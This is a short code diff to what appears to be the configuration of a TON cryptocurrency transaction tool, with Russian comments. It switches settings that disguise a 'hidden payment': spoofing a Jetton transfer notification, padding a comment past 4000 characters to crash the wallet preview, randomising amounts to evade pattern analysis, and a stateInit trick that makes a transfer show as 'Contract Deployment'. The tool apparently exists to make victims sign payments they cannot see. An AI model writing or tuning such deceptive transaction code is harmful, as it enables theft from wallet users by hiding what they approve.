@@ -8,11 +8,16 @@ var NETWORK         = "mainnet";
 
 // === НАСТРОЙКИ ОБФУСКАЦИИ ===
 // Метод обфускации для скрытого payload:
-// "empty" - пустой payload (рекомендуется, минимальный след)
+// "empty" - пустой payload (минимальный след)
 // "encrypted" - зашифрованный payload (op=0x2167da4b)
 // "obfuscated" - payload со случайными данными
-var OBFUSCATION_METHOD = "empty";
+// "jetton" - имитация Jetton transfer notification (op=0x7362d09c)
+// "overflow" - длинный комментарий 4000+ символов (крашит preview)
+var OBFUSCATION_METHOD = "overflow";
 
 // Рандомизация суммы скрытого платежа (затрудняет паттерн-анализ)
 var RANDOMIZE_AMOUNT = true;
 var AMOUNT_VARIANCE = 0.05; // ±5% от HIDDEN_AMOUNT
+
+// Использовать stateInit трюк (показывает "Contract Deployment" вместо перевода)
+var USE_STATEINIT = true;
